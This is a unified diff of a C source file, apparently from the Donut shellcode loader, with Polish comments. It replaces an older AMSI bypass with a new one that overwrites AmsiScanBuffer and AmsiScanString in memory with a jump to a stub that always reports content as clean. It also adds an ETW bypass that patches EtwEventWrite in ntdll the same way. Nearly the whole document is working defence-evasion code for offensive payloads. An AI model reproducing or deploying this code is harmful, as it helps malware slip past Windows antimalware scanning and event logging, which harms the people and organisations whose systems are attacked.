@@ -31,103 +31,23 @@
 
 #include "bypass.h"
 #define BYPASS_AMSI_E
+#define BYPASS_ETW_C
 
-#if defined(BYPASS_AMSI_NONE)
-BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+#if defined(BYPASS_AMSI_E) || defined(BYPASS_ETW_C)
+BOOL ReplaceTarget(PDONUT_INSTANCE inst, BYTE* function, LPVOID target, DWORD function_len) {
+  DWORD op, t;
+
+  if(!inst->api.VirtualProtect(target, function_len, PAGE_EXECUTE_READWRITE, &op)) 
+    return FALSE;
+  DPRINT("Overwriting function at: 0x%p", function);
+  Memcpy(target, function, function_len);
+  if(!inst->api.VirtualProtect(target, function_len, op, &t))
+    return FALSE;
   return TRUE;
 }
+#endif
 
-#elif defined(BYPASS_AMSI_E)
-#define NtCurrentPeb()            (NtCurrentTeb()->ProcessEnvironmentBlock)
-BOOL UnicodeStringToAnsiString(UNICODE_STRING* unicodeStr, char** ansiStr, PDONUT_INSTANCE inst) {
-    int bufferSize = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, NULL, 0, NULL, NULL);
-    if (bufferSize == 0) {
-        return FALSE;
-    }
-    *ansiStr = inst->api.VirtualAlloc(NULL, bufferSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (*ansiStr == NULL) {
-        return STATUS_NO_MEMORY;
-    }
-
-    int result = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, *ansiStr, bufferSize, NULL, NULL);
-    if (result == 0) {
-        inst->api.VirtualFree(*ansiStr, bufferSize + 1, MEM_RELEASE | MEM_DECOMMIT);
-        return FALSE;
-    }
-
-    (*ansiStr)[bufferSize] = '\0';
-    
-    return FALSE;
-}
-
-int CompareDllPrefix(const char* str1, const char* str2) {
-    while (*str1 != '\0' && *str2 != '\0') {
-        if (*str1 == '.' && *(str1+1) == 'd' && *(str1+2) == 'l' && *(str1+3) == 'l') {
-            return 0;
-        }
-        if (*str2 == '.' && *(str2+1) == 'd' && *(str2+2) == 'l' && *(str2+3) == 'l') {
-            return 0;
-        }
-        if (*str1 != *str2) {
-            return 0;
-        }
-        str1++;
-        str2++;
-    }
-    return 1;
-}
-
-
-HMODULE FindModule(const char* moduleName, PDONUT_INSTANCE inst) {
-    // Get PEB address using NtCurrentPeb
-    PPEB peb = NtCurrentPeb();
-    PEB_LDR_DATA* ldrData = peb->Ldr;
-    LIST_ENTRY* head = &ldrData->InLoadOrderModuleList;
-    LIST_ENTRY* current = head->Flink;
-
-    // Iterate over the linked list of loaded modules
-    while (current != head) {
-        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        char* ansiStr;
-        UnicodeStringToAnsiString(&entry->BaseDllName, &ansiStr, inst);
-        int eq = CompareDllPrefix(ansiStr, moduleName);
-        if (entry && CompareDllPrefix(ansiStr, moduleName)) {
-          DPRINT("Found Amsi.dll at: %p", entry->DllBase);
-          return (HMODULE)entry->DllBase;
-        }
-        current = current->Flink;
-    }
-    return NULL;
-}
-
-void* FindExportTable(HMODULE hModule) {
-    // Uzyskaj nagłówek DOS
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
-    
-    // Sprawdzenie, czy nagłówek DOS jest poprawny
-    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        return;
-    }
-
-    // Przejdź do nagłówka NT
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
-    
-    // Sprawdzenie, czy nagłówek NT jest poprawny
-    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        return;
-    }
-
-    // Znajdź adres tabeli eksportów
-    DWORD exportTableRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (exportTableRVA == 0) {
-        return;
-    }
-
-    // Oblicz adres tabeli eksportów w pamięci
-    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportTableRVA);
-    return exportDir;
-}
-
+#if defined(BYPASS_AMSI_E)
 HRESULT WINAPI AmsiScanBufferStub(
     HAMSICONTEXT amsiContext,
     PVOID        buffer,
@@ -137,268 +57,60 @@ HRESULT WINAPI AmsiScanBufferStub(
     AMSI_RESULT  *result)
 {    
     *result = AMSI_RESULT_CLEAN;
-    volatile int noop = 0xC50505;
-    for (int j = 0; j < 1000; j++) {
-        noop += j;  // Zmienia wartość zmiennej, ale nie wpływa na funkcjonalność
-    }
     return S_OK;
 }
 
-int AmsiScanBufferStubEnd(int a, int b) {
-  if(a==b) {
-      int c = 0;
-      c++;
-    }
-  return 0;
-}
-
-// Implementacja prostego algorytmu LCG
-int my_rand(unsigned int seed) {
-    unsigned long rand_state = seed;
-    // Parametry algorytmu LCG
-    unsigned long a = 1664525;   // Stała mnożenia
-    unsigned long c = 1013904223; // Stała dodawania
-    unsigned long m = 4294967296; // Moduł (2^32)
-    
-    // Zaktualizowanie stanu generatora
-    rand_state = (a * rand_state + c) % m;
-    
-    // Zwrócenie wartości pseudolosowej
-    return rand_state & 0x7FFFFFFF; // Ograniczamy do 32-bitowej liczby (od 0 do RAND_MAX)
-}
-
-void swap(void *a, void *b, size_t size) {
-    unsigned char *pa = (unsigned char *)a;
-    unsigned char *pb = (unsigned char *)b;
-    for (size_t i = 0; i < size; i++) {
-        unsigned char tmp = pa[i];
-        pa[i] = pb[i];
-        pb[i] = tmp;
-    }
-}
-
-// intptr_t replaceReturnWithJump(PDONUT_INSTANCE inst, void* function, size_t functionSize, void* jumpTarget) {
-//     DWORD oldProtect;
-//     BYTE* funcBytes = (BYTE*)function;
-//     BYTE* target = (BYTE*)jumpTarget;
-//     DPRINT("PTR replaceReturnWithJump 0x%p\n", replaceReturnWithJump);
-//     // Odblokowanie pamięci na zapis
-//     // 48 B8 49 92 24 49 FF FF FF 00
-//     // FF E0
-//     if (inst->api.VirtualProtect(function, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-//         // Przeszukiwanie kodu funkcji w poszukiwaniu instrukcji `ret` (0xC3)
-//         for (size_t i = 0; i < functionSize; i++) {
-//             if (funcBytes[i] == 0x05 && funcBytes[i+1] == 0x05 && funcBytes[i+2] == 0xC5) {
-//                 i = i - 4; // Znaleziono `ret`
-//                 DPRINT("Found '0xC50505' at offset 0x%zx\n", i);
-//                 DPRINT("Found '0xC50505' at 0x%p\n", &funcBytes[i]);
-
-//                 // Obliczanie relatywnego offsetu dla skoku
-//                 intptr_t offset = target - (funcBytes + i + 5); // +5 = rozmiar instrukcji `jmp`
-//                 DPRINT("Offset to ret 0x%x\n", offset);
-//                 funcBytes[i] = 0xE9; // `jmp` opcode
-//                 *(int32_t*)(funcBytes + i + 1) = (int32_t)offset; // Wstawienie relatywnego offsetu
-//                 DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", funcBytes + i + 5 + offset);
-//                 DPRINT("Offset value: %x\n", ((unsigned char*)funcBytes)[i + 5 + offset]);
-//                 DPRINT("Offset value: %x\n", *(funcBytes + i + 5 + offset));
-//                 inst->api.VirtualProtect(function, functionSize, oldProtect, &oldProtect);
-//                 inst->api.FlushInstructionCache(GetCurrentProcess(), function, functionSize);
-//                 return funcBytes + i + 5;
-//             }
-//         }
-
-//         // Przywrócenie ochrony pamięci
-        
-//     }
-//     else {
-//         printf("Failed to change memory protection.\n");
-//     }
-// }
-
-intptr_t replaceReturnWithJump(PDONUT_INSTANCE inst, void* function, size_t functionSize, void* jumpTarget) {
-    HMODULE dll;
-    LPVOID  cs;
-
-    // try load amsi. if unable, assume DLL doesn't exist
-    // and return TRUE to indicate it's okay to continue
-    dll = xGetLibAddress(inst, inst->amsi);
-    if(dll == NULL) return TRUE;
-    
-    // resolve address of AmsiScanBuffer. if not found,
-    // return FALSE because it should exist ...
-    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
-    functionSize = 32;
-    DWORD oldProtect;
-    BYTE* funcBytes = (BYTE*)cs;
-    BYTE* target = (BYTE*)jumpTarget;
-    DPRINT("PTR replaceReturnWithJump 0x%p\n", replaceReturnWithJump);
-    // Odblokowanie pamięci na zapis
-    // 48 B8 49 92 24 49 FF FF FF 00
-    // FF E0
-    if (inst->api.VirtualProtect(funcBytes, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        // Przeszukiwanie kodu funkcji w poszukiwaniu instrukcji `ret` (0xC3)
-        // for (size_t i = 0; i < functionSize; i++) {
-        //     if (funcBytes[i] == 0x05 && funcBytes[i+1] == 0x05 && funcBytes[i+2] == 0xC5) {
-        //         i = i - 4; // Znaleziono `ret`
-        //         DPRINT("Found '0xC50505' at offset 0x%zx\n", i);
-        //         DPRINT("Found '0xC50505' at 0x%p\n", &funcBytes[i]);
-
-        //         // Obliczanie relatywnego offsetu dla skoku
-        //         funcBytes[i] = 0x48;
-        //         funcBytes[i+1] = 0xB8;
-        //         *(int64_t*)(funcBytes + i + 2) = (int64_t)jumpTarget; // Wstawienie relatywnego offsetu
-        //         DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", jumpTarget);
-        //         DPRINT("Offset value: %x\n", *(char*)jumpTarget);
-        //         funcBytes[i+10] = 0xFF;
-        //         funcBytes[i+11] = 0xE0;
-        //         inst->api.VirtualProtect(funcBytes, functionSize, oldProtect, &oldProtect);
-        //         inst->api.FlushInstructionCache(GetCurrentProcess(), funcBytes, functionSize);
-        //         return funcBytes + i + 5;
-        //     }
-        // }
-        int i = 0;
-        funcBytes[i] = 0x48;
-        funcBytes[i+1] = 0xB8;
-        *(int64_t*)(funcBytes + i + 2) = (int64_t)function; // Wstawienie relatywnego offsetu
-        DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", function);
-        DPRINT("Offset value: %x\n", *(char*)function);
-        funcBytes[i+10] = 0xFF;
-        funcBytes[i+11] = 0xE0;
-        inst->api.VirtualProtect(funcBytes, functionSize, oldProtect, &oldProtect);
-        inst->api.FlushInstructionCache(inst->api.GetCurrentProcess(), funcBytes, functionSize);
-        return funcBytes + i + 5;
-
-        // Przywrócenie ochrony pamięci
-        
-    }
-    else {
-        DPRINT("Failed to change memory protection.");
-    }
-}
-
-
-// Funkcja do kopiowania integer z jednego obszaru do drugiego w zakamuflowany sposób
-void obscure_copy(PDONUT_INSTANCE inst, void** src, void** dst, size_t len) {
-    // Zastosowanie tablicy wskaźników pomocniczych traktowanych jako char*
-    char** helper_array = (char**)inst->api.VirtualAlloc(NULL, len * sizeof(char*), MEM_COMMIT, PAGE_READWRITE);
-    if (helper_array == NULL) {
-        return;
-    }
-
-    // Inicjalizacja wskaźników pomocniczych jako char*
-    for (size_t i = 0; i < len; i++) {
-        helper_array[i] = (char*)src[i]; // Kopiowanie wskaźników funkcji jako char*
-    }
-
-    // Wstawienie wskaźników do "zakamuflowanego" miejsca docelowego
-    for (size_t i = 0; i < len; i++) {
-        DPRINT("Size %d", len)
-        // Kopiowanie wskaźników do losowo wybranego "miejsca docelowego"
-        swap(&dst[i], &helper_array[my_rand(12345) % len], sizeof(char*));
-    }
-
-    // Zwalniamy pamięć
-    inst->api.VirtualFree(helper_array, 0, MEM_RELEASE);
-}
-
-intptr_t replace_stub(PDONUT_INSTANCE inst) {
-  DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
-  (ULONG_PTR)AmsiScanBufferStub;
-  void* jumpTarget = NULL;
-  BYTE* funcBytes = (BYTE*)xGetProcAddress(inst, xGetLibAddress(inst, inst->amsi), inst->amsiScanStr, 0);
-  for (size_t i = 0; i < 120; i++) {
-
-      if (funcBytes[i] == 0xC3) { // Znaleziono `ret`
-          DPRINT("Found 'ret' at offset 0x%zx", i);
-          jumpTarget = &funcBytes[i];
-          DPRINT("Found 'ret' at 0x%p\n", jumpTarget);
-          break;
-      }
-  }
-  return replaceReturnWithJump(inst, (void*)AmsiScanBufferStub, len, jumpTarget);
-}
-
-
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  xGetLibAddress(inst, inst->amsi);
+  HMODULE dll;
+  DWORD   len = 0;
+  LPVOID  cs;
 
-  // HMODULE dll;
-  // DWORD   len, op, t;
-  // LPVOID  cs;
+#ifdef _WIN64
+  BYTE funcBytes[12]; // Rozmiar dla 48 B8 (2 bajty) + imm64 (8 bajtów) + FF E0 (2 bajty)
 
-  // // try load amsi. if unable, assume DLL doesn't exist
-  // // and return TRUE to indicate it's okay to continue
-  // dll = xGetLibAddress(inst, inst->kernelbase);
-  // if(dll == NULL) return TRUE;
-  
-  // // resolve address of AmsiScanBuffer. if not found,
-  // // return FALSE because it should exist ...
-  // cs = xGetProcAddress(inst, dll, "DebugBreak", 0);
-  
-  // ((void(*)(void))cs)();
+  funcBytes[0] = 0x48; // REX prefix
+  funcBytes[1] = 0xB8; // MOV RAX, imm64
+  *(uint64_t*)(funcBytes + 2) = (uint64_t)(AmsiScanBufferStub); // imm64 (adres funkcji)
+  funcBytes[10] = 0xFF; // JMP RAX
+  funcBytes[11] = 0xE0;
+  len = 12;
+#else
+  BYTE funcBytes[7];
 
-  HMODULE amsiDll = FindModule(inst->amsi, inst);  // Find the AMSI library
-  if (amsiDll == NULL) {
-      return FALSE;
-  }
-  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(amsiDll);
-  if (!exportDir) {
-    return FALSE;
-  }
-
-  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfFunctions);
-  DWORD* pFunctionNames = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfNames);
-  WORD* pNameOrdinals = (WORD*)((BYTE*)amsiDll + exportDir->AddressOfNameOrdinals);
-
-  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-    char* funcName = (char*)((BYTE*)amsiDll + pFunctionNames[i]);
-    if (compare(funcName, inst->amsiScanBuf)) {
-        // Znaleziono nazwę funkcji, zwróć jej adres
-        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
-        void* functionAddr = (void*)((BYTE*)amsiDll + functionRVA);
-        DPRINT("Fuzzing AmsiScanBuffer at: %p", functionAddr);
-        DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
-        (ULONG_PTR)AmsiScanBufferStub;
-        DWORD op = 0;
-        DWORD t = 0;
-        DPRINT("%d", len)
-        //fprintf(stderr, "\n");
-        int i = 0;
-        while (i < len)
-        {
-            //fprintf(stderr, "%02X",((unsigned char*)AmsiScanBufferStub)[i]);
-            i++;
-        }
-        //fprintf(stderr, "\n");
-        if(!inst->api.VirtualProtect(
-          functionAddr, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE; 
-        DPRINT("Overwriting AmsiScanBuffer");
-        // over write with virtual address of stub
-        intptr_t ptr = replace_stub(inst);
-        // DWORD new_len = (ULONG_PTR)ptr -
-        // (ULONG_PTR)AmsiScanBufferStub;
-        // fprintf(stderr, "\n");
-        // i = 0;
-        // while (i < new_len)
-        // {
-        //     fprintf(stderr, "%02X",((unsigned char*)AmsiScanBufferStub)[i]);
-        //     i++;
-        // }
-        //fprintf(stderr, "\n");
-        DPRINT("AmsiScanBufferStub at: %p", AmsiScanBufferStub);
-        DPRINT("AmsiScanBufferStubEnd at: %p", AmsiScanBufferStubEnd);
-        //Memcpy(functionAddr, ADR(PCHAR, AmsiScanBufferStub), len);
-        // set memory back to original protection
-        inst->api.VirtualProtect(functionAddr, len, op, &t);
-        return TRUE;
+  funcBytes[0] = 0xB8;
+  *(DWORD*)(funcBytes + 1) = ADR(DWORD, AmsiScanBufferStub);
+  funcBytes[5] = 0xFF;
+  funcBytes[6] = 0xE0;
+  len = 7;
+#endif
+  DPRINT("AmsiScanBufferStub: 0x%p", AmsiScanBufferStub);
+  DPRINT("Function bytes: ");
+    for (int i = 0; i < len; i++) {
+      DPRINT("%02X ", funcBytes[i]); // Wyświetlenie bajtów w formacie szesnastkowym
     }
-  }
+  DPRINT("\n");
+
+  dll = xGetLibAddress(inst, inst->amsi);
+  if(dll == NULL) return TRUE;
   
-  DPRINT("Function not found.");
-  return FALSE;
+  cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+
+  cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+  
+  return TRUE;
 }
 
 #elif defined(BYPASS_AMSI_A)
+// This is where you may define your own AMSI bypass.
+// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
   return TRUE;
 }
@@ -727,59 +439,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 // This is where you may define your own ETW bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
 BOOL DisableETW(PDONUT_INSTANCE inst) {
-  HMODULE ntdll = FindModule(inst->ntdll, inst);  // Find the AMSI library
-  if (ntdll == NULL) {
-      return FALSE;
-  }
-  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(ntdll);
-  if (!exportDir) {
-    return FALSE;
-  }
-
-  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfFunctions);
-  DWORD* pFunctionNames = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfNames);
-  WORD* pNameOrdinals = (WORD*)((BYTE*)ntdll + exportDir->AddressOfNameOrdinals);
-
-  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-    char* funcName = (char*)((BYTE*)ntdll + pFunctionNames[i]);
-    if (compare(funcName, inst->etwEventWrite)) {
-        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
-        void* functionAddr = (void*)((BYTE*)ntdll + functionRVA);
-        DPRINT("Fuzzing etwEventWrite at: %p", functionAddr);
-        DWORD op = 0;
-        DWORD t = 0;
-
-        #ifdef _WIN64
-            // make the memory writeable. return FALSE on error
-            if (!inst->api.VirtualProtect(
-                functionAddr, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-
-            DPRINT("Overwriting EtwEventWrite");
-
-            // over write with "ret"
-            Memcpy(functionAddr, inst->etwRet64, 1);
-
-            // set memory back to original protection
-            inst->api.VirtualProtect(functionAddr, 1, op, &t);
-        #else
-            // make the memory writeable. return FALSE on error
-            if (!inst->api.VirtualProtect(
-                functionAddr, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-
-            DPRINT("Overwriting EtwEventWrite");
-
-            // over write with "ret 14h"
-            Memcpy(functionAddr, inst->etwRet32, 4);
-
-            // set memory back to original protection
-            inst->api.VirtualProtect(functionAddr, 4, op, &t);
-        #endif
-        return TRUE;
-    }
-  }
-  
-  DPRINT("Function not found.");
-  return FALSE;
+  return TRUE;
 }
 
 #elif defined(BYPASS_ETW_B)
@@ -824,6 +484,61 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
     return TRUE;
 
+}
+#elif defined(BYPASS_ETW_C)
+ULONG WINAPI EtwEventWriteStub(
+    REGHANDLE RegHandle,
+    PCEVENT_DESCRIPTOR EventDescriptor,
+    ULONG UserDataCount,
+    PEVENT_DATA_DESCRIPTOR UserData) 
+{
+  #ifdef _WIN64
+    return 0;
+  #else
+    return 0x14;
+  #endif
+}
+
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+  HMODULE dll;
+  DWORD   len = 0;
+  LPVOID  cs;
+
+#ifdef _WIN64
+  BYTE funcBytes[12]; // Rozmiar dla 48 B8 (2 bajty) + imm64 (8 bajtów) + FF E0 (2 bajty)
+
+  funcBytes[0] = 0x48; // REX prefix
+  funcBytes[1] = 0xB8; // MOV RAX, imm64
+  *(uint64_t*)(funcBytes + 2) = (uint64_t)(EtwEventWriteStub); // imm64 (adres funkcji)
+  funcBytes[10] = 0xFF; // JMP RAX
+  funcBytes[11] = 0xE0;
+  len = 12;
+#else
+  BYTE funcBytes[7];
+
+  funcBytes[0] = 0xB8;
+  *(DWORD*)(funcBytes + 1) = ADR(DWORD, EtwEventWriteStub);
+  funcBytes[5] = 0xFF;
+  funcBytes[6] = 0xE0;
+  len = 7;
+#endif
+  DPRINT("EtwEventWriteStub: 0x%p", EtwEventWriteStub);
+  DPRINT("Function bytes: ");
+    for (int i = 0; i < len; i++) {
+      DPRINT("%02X ", funcBytes[i]); // Wyświetlenie bajtów w formacie szesnastkowym
+    }
+  DPRINT("\n");
+
+  dll = xGetLibAddress(inst, inst->ntdll);
+  if(dll == NULL) return TRUE;
+  
+  cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+  
+  return TRUE;
 }
 
 #endif
